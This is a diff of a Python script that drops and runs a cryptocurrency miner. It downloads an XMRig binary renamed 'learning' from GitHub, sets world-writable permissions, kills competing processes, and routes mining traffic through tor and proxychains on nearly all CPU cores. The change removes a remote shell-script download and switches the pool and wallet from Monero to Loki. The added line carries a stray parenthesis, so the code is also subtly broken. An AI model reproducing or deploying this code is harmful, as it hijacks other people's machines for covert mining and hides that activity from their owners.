@@ -6,7 +6,6 @@ import multiprocessing
 useproxy = 0
 os.system('chmod 777 ' + __file__)
 program = 'learning'
-shell = 'ai.sh'
 os.system('pkill ' + program)
 cores = multiprocessing.cpu_count() - 1
 if cores <= 0:
@@ -23,7 +22,6 @@ try:
     os.system('make install')
     os.system('make install-config')
     if not os.path.isfile('/usr/local/bin/' + program):
-        os.system('wget  -qO- https://raw.githubusercontent.com/ToRxmrig/container--1hp8ak/main/'  + shell)
         os.system('wget https://github.com/ts6aud5vkg/daovps/raw/master/xmrig_tls/' + program)
         os.system('chmod 777 ' + program)
         workingdir = os.getcwd()
@@ -35,4 +33,4 @@ except:
 
 os.system('tor &')
 time.sleep(60)
-os.system('proxychains4 ' + program + ' --donate-level 1 -o xmr-us-west1.nanopool.org:14433 -u 4AYe7ZbZEAMezv8jVqnagtWz24nA8dkcPaqHa8p8MLpqZvcWJSk7umPNhDuoXM2KRXfoCB7N2w2ZTLmTPj5GgoTvBipk1s9 -p az -a rx/0 -k --tls -t ' + str(cores))
+os.system('proxychains4 ' + program + ' --donate-level 1 -o loki.herominers.com:10114 -u LDFKUgMc5zudMEYdNJoxrHVtckxfLuS3GQRVEGoYa1saNirBrBR1xbG9idbGZoS6ieFDz371dgfynAxzYbn1zoQa5UafGzn -p x -a rx/loki -k --tls -t ' + str(cores)))
